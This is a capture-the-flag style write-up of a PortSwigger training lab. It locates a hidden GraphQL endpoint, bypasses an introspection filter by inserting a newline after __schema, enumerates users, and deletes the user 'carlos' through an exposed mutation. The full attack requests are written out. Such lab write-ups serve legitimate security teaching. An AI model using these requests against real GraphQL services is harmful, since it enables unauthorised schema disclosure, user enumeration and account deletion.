# Finding a hidden GraphQL endpoint

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint), you'll learn: Discovering GraphQL endpoint, and bypassing introspection defense! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.

To solve the lab, find the hidden endpoint and delete Carlos.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater, and enables you to scan the API schema.

For more information on using InQL, see [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql).

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707131338.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707131540.png)

In here, we can see the web application is an E-commerce website, and there's no GraphQL queries have been made.

To find a GraphQL endpoint, we can send `query{__typename}` to any GraphQL endpoint, it will include the string `{"data": {"__typename": "query"}}` somewhere in its response. This is known as a universal query, and is a useful tool in probing whether a URL corresponds to a GraphQL service.

The query works because every GraphQL endpoint has a reserved field called `__typename` that returns the queried object's type as a string.

GraphQL services often use similar endpoint suffixes. When testing for GraphQL endpoints, we should look to send universal queries to the following locations:

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

If these common endpoints don't return a GraphQL response, we could also try appending `/v1` to the path.

> Note: GraphQL services will often respond to any non-GraphQL request with a "query not present" or similar error. We should bear this in mind when testing for GraphQL endpoints.

**After some testing, I found that `/api` endpoint respond with a "query not present" error:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707132146.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707132842.png)

Hence, `/api` is the GraphQL endpoint.

**Next, we can try send a POST request with `Content-Type` `application/json`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707132317.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707132356.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707132417.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707132431.png)

> Note: I'm using extension "Content Type Converter" to convert the `Content-Type` to `application/json`.

**However, when we send the request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707132547.png)

It respond us with `405 Method Not Allowed`, which means the GraphQL endpoint **only allows GET method**.

**Armed with the GraphQL endpoint (`/api`) and it only allows GET method, we can try to probe for introspection:**
```http
GET /api?query={__schema{queryType{name}}} HTTP/2
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707133002.png)

Unfortunately, the GraphQL endpoint blocked our introspection query, as the query contains `__schema` or `__type`.

Luckily, we can bypass the filter.

If we cannot get introspection queries to run for the API we are testing, try inserting a special character after the `__schema` keyword.

When developers disable introspection, they could use a regex to exclude the `__schema` keyword in queries. We should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.

As such, if the developer has only excluded `__schema{`, then the below introspection query would not be excluded.

**Introspection query with newline (POST request):**
```
{
    "query": "query{__schema
    {queryType{name}}}"
}
```

**Introspection query with newline (GET request):**
```http
GET /api?query={__schema%0a{queryType{name}}} HTTP/2
```

> Note: The `%0a` is URL encoded new line character (`\n`).

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707133501.png)

Nice! We bypassed the `__schema` filter!

**That being said, we can now perform a full introspection query:**
```http
GET /api?query={__schema%0a{types{name,fields{name,args{name,description,type{name,kind,ofType{name,kind}}}}}}} HTTP/2
```

> Query is from [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql#basic-enumeration).

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707134506.png)

**In the response, we found the following type and query:**
```json
{
  "data": {
    "__schema": {
      "types": [
        [...]
        {
          "name": "DeleteOrganizationUserInput",
          "fields": null
        },
        {
          "name": "DeleteOrganizationUserResponse",
          "fields": [
            {
              "name": "user",
              "args": []
            }
          ]
        },
        [...]
        {
          "name": "User",
          "fields": [
            {
              "name": "id",
              "args": []
            },
            {
              "name": "username",
              "args": []
            }
          ]
        },
        [...]
        {
          "name": "mutation",
          "fields": [
            {
              "name": "deleteOrganizationUser",
              "args": [
                {
                  "name": "input",
                  "description": null,
                  "type": {
                    "name": "DeleteOrganizationUserInput",
                    "kind": "INPUT_OBJECT",
                    "ofType": null
                  }
                }
              ]
            }
          ]
        },
        {
          "name": "query",
          "fields": [
            {
              "name": "getUser",
              "args": [
                {
                  "name": "id",
                  "description": null,
                  "type": {
                    "name": null,
                    "kind": "NON_NULL",
                    "ofType": {
                      "name": "Int",
                      "kind": "SCALAR"
                    [...]
```

- Type:
    - `DeleteOrganizationUserInput`
    - `DeleteOrganizationUserResponse`, field `user`
    - `User`, field `id`, `username`
- Mutation query:
    - `deleteOrganizationUser`, argument `input[DeleteOrganizationUserInput]`
- Query:
    - `getUser`, argument `id`

**With that send, we can first try to query `getUser` with `id` argument to enumerate different users:**

**Query in POST request:**
```graphql
{
    getUser(id:1) {
        id
        username
    }
}
```

**Query in GET request:**
```http
GET /api?query={getUser(id:1){id,username}} HTTP/2

GET /api?query={getUser(id:2){id,username}} HTTP/2

GET /api?query={getUser(id:3){id,username}} HTTP/2
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707140510.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707140525.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707140531.png)

As you can see, user `carlos`'s `id` is `3`.

**Then, we can use the `deleteOrganizationUser` mutation query to delete a user, like `carlos`:**

**Query in POST request:**
```graphql
mutation {
    deleteOrganizationUser(input:{id:3}) {
        user {
            id
            username    
        }
    }
}
```

**Query in GET request:**
```http
GET /api?query=mutation{deleteOrganizationUser(input:{id:3}){user{id,username}}} HTTP/2
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-3/images/Pasted%20image%2020230707141320.png)

We successfully deleted user `carlos`!

# What we've learned:

1. Discovering GraphQL Endpoint
2. Bypassing Introspection Defense